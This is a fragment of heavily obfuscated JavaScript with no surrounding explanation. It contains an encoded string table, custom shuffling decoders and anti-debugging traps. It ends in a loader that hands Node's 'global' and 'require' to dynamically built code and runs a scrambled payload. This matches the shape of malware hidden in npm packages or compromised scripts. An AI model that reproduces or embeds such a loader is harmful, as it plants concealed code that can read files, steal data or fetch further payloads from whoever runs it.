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','mJe1nZu1ne5oC2HQsW','BgvUz3rO','ELjPugC','ywn0Aw9U','mJqXndGXmgfOEeHVtG','mJy1nJi5mvDKEK1uwq','zNvUy3rPB24GkLWOicPCkq','zgvIDq','otu5nte4mLPqvxfPzG','nJm4mdaXnJbQAhfmDwK','zNjVBunOyxjdB2rL','nhjduwDAwq','z2DLCG'];_0x7379=function(){return _0x215997;};return _0x7379();}(function(_0x5116e8,_0x519b52){var _0xa14dc2=_0xf4e0,_0x46a609=_0x5116e8();while(!![]){try{var _0x5df002=-parseFloat(_0xa14dc2(0xe))/0x1+-parseFloat(_0xa14dc2(0x10))/0x2+Math['trunc'](-parseFloat(_0xa14dc2(0x9))/0x3)+-parseFloat(_0xa14dc2(0x1b))/0x4*Math['max'](parseFloat(_0xa14dc2(0x5))/0x5,parseFloat(_0xa14dc2(0x18))/0x6)+Math['floor'](parseFloat(_0xa14dc2(0x4))/0x7)*(-parseFloat(_0xa14dc2(0x0))/0x8)+Number(-parseFloat(_0xa14dc2(0x1e))/0x9)*Math['max'](-parseFloat(_0xa14dc2(0x14))/0xa,-parseFloat(_0xa14dc2(0x15))/0xb)+parseFloat(_0xa14dc2(0x19))/0xc;if(_0x5df002===_0x519b52)break;else _0x46a609['push'](_0x46a609['shift']());}catch(_0x183bd0){_0x46a609['push'](_0x46a609['shift']());}}}(_0x7379,0xc9c80));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x60591b,_0x50caa0){var _0x3ba200=_0xf4e0,_0x34b104={'CqrVE':function(_0x4db482,_0x5ef49c){return _0x4db482*_0x5ef49c;}};for(var _0x43cf6f,_0x565f20,_0x4cc67a,_0x23133d,_0xe263ba,_0x274bfd,_0x5b3246=[],_0x229c66=0x0,_0x55a856=_0x50caa0[0x0];_0x229c66<_0x60591b[_0x3ba200(0x11)];)_0x5b3246[_0x229c66]=_0x60591b['charAt'](_0x229c66),_0x229c66+=0x1;for(_0x43cf6f=_0x5b3246['length'],_0x229c66=0x0;_0x229c66<_0x43cf6f;)_0x565f20=_0x55a856*(_0x229c66+_0x50caa0[0x1])+_0x55a856%_0x50caa0[0x2],_0xe263ba=(_0x4cc67a=_0x34b104['CqrVE'](_0x55a856,_0x229c66+_0x50caa0[0x3])+_0x55a856%_0x50caa0[0x4])%_0x43cf6f,_0x274bfd=_0x5b3246[_0x23133d=_0x565f20%_0x43cf6f],_0x5b3246[_0x23133d]=_0x5b3246[_0xe263ba],_0x5b3246[_0xe263ba]=_0x274bfd,_0x55a856=(_0x565f20+_0x4cc67a)%_0x50caa0[0x5],_0x229c66+=0x1;return _0x5b3246['join']('');}function _0xf4e0(_0x25a43b,_0x14df61){var _0x464a87=_0x7379();return _0xf4e0=function(_0x4a68a2,_0x73791){_0x4a68a2=_0x4a68a2-0x0;var _0xf4e069=_0x464a87[_0x4a68a2];if(_0xf4e0['apstBn']===undefined){var _0x4d34f3=function(_0x11537b){var _0x126cb1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x133077='',_0x30ecab='';for(var _0x476c05=0x0,_0x197695,_0x38bdd2,_0x1d0098=0x0;_0x38bdd2=_0x11537b['charAt'](_0x1d0098++);~_0x38bdd2&&(_0x197695=_0x476c05%0x4?_0x197695*0x40+_0x38bdd2:_0x38bdd2,_0x476c05++%0x4)?_0x133077+=String['fromCharCode'](0xff&_0x197695>>(-0x2*_0x476c05&0x6)):0x0){_0x38bdd2=_0x126cb1['indexOf'](_0x38bdd2);}for(var _0x51518a=0x0,_0x29c694=_0x133077['length'];_0x51518a<_0x29c694;_0x51518a++){_0x30ecab+='%'+('00'+_0x133077['charCodeAt'](_0x51518a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x30ecab);};_0xf4e0['EgkCmN']=_0x4d34f3,_0x25a43b=arguments,_0xf4e0['apstBn']=!![];}var _0x2d590e=_0x464a87[0x0],_0x12507a=_0x4a68a2+_0x2d590e,_0x586ebd=_0x25a43b[_0x12507a];return!_0x586ebd?(_0xf4e069=_0xf4e0['EgkCmN'](_0xf4e069),_0x25a43b[_0x12507a]=_0xf4e069):_0xf4e069=_0x586ebd,_0xf4e069;},_0xf4e0(_0x25a43b,_0x14df61);}function splitLane(_0x1b76ad){var _0x4a3bf2=_0xf4e0,_0x5f1249=String[_0x4a3bf2(0x1a)](0x1c),_0x221ba2=spin(_0x1b76ad,NX);return(_0x221ba2=(_0x221ba2=(_0x221ba2=_0x221ba2['split']('^')[_0x4a3bf2(0x22)](_0x5f1249))[_0x4a3bf2(0xc)]('*1')[_0x4a3bf2(0x22)]('^'))['split']('*0')['join']('*'))[_0x4a3bf2(0xc)](_0x5f1249);}function peel(_0x423450){var _0x56256a={'wqlpu':function(_0x25bd44,_0x2cb8ac,_0x475a28){return _0x25bd44(_0x2cb8ac,_0x475a28);}};return _0x56256a['wqlpu'](spin,_0x423450,SX);}!function(_0x5c3cc6,_0x535a83){var _0x217c0a=_0xf4e0,_0x244199={'oxjgL':'\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','JNfZP':'c^mejb^tro','EKWmU':_0x217c0a(0xb)},_0x3a08f7=(function(){var _0x5a7624=!![];return function(_0x7d38ce,_0x3e76e8){var _0x12f471=_0x5a7624?function(){if(_0x3e76e8){var _0x2204eb=_0x3e76e8['apply'](_0x7d38ce,arguments);return _0x3e76e8=null,_0x2204eb;}}:function(){};return _0x5a7624=![],_0x12f471;};}());(function(){_0x3a08f7(this,function(){var _0xadd456=_0xf4e0,_0x24d25b=new RegExp(_0xadd456(0x16)),_0x3da628=new RegExp(_0x244199[_0xadd456(0x1f)],'i'),_0x1bca9f=_0x464a87(_0xadd456(0x2));!_0x24d25b['test'](_0x1bca9f+_0xadd456(0x7))||!_0x3da628['test'](_0x1bca9f+'input')?_0x1bca9f('0'):_0x464a87();})();}()),_0x5c3cc6['z']=z;var _0x25b74c=splitLane(_0x244199[_0x217c0a(0x20)]);_0x5c3cc6[_0x25b74c[0x0]]=_0x535a83,typeof module===_0x25b74c[0x1]&&(_0x5c3cc6[_0x25b74c[0x2]]=module);var _0x20683f=peel(_0x244199[_0x217c0a(0x3)]),_0x437ab7=peel[_0x20683f[_0x217c0a(0x1)](0x0,0xb)],_0x324cf0=_0x437ab7('',peel('=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20'));_0x437ab7('',_0x324cf0(peel(_0x217c0a(0xf))))(0x9cd);}(global,require);function _0x464a87(_0xcb1a5f){var _0x5170b4={'IgUJa':'length','zGoaK':function(_0x42e373,_0x1938a2){return _0x42e373%_0x1938a2;},'zRiPg':function(_0x2edc38,_0x32bfcc){return _0x2edc38+_0x32bfcc;}};function _0x17ad29(_0x3fefde){var _0x33350a=_0xf4e0;if(typeof _0x3fefde==='string')return function(_0x76632c){}['constructor']('while\x20(true)\x20{}')[_0x33350a(0x8)](_0x33350a(0xd));else(''+_0x3fefde/_0x3fefde)[_0x5170b4[_0x33350a(0x1d)]]!==0x1||_0x5170b4[_0x33350a(0x6)](_0x3fefde,0x14)===0x0?function(){return!![];}[_0x33350a(0x21)](_0x5170b4[_0x33350a(0x12)](_0x33350a(0x17),_0x33350a(0x1c)))['call'](_0x33350a(0x13)):function(){return![];}['constructor'](_0x33350a(0x17)+'gger')[_0x33350a(0x8)](_0x33350a(0xa));_0x17ad29(++_0x3fefde);}try{if(_0xcb1a5f)return _0x17ad29;else _0x17ad29(0x0);}catch(_0x28bbdf){}}
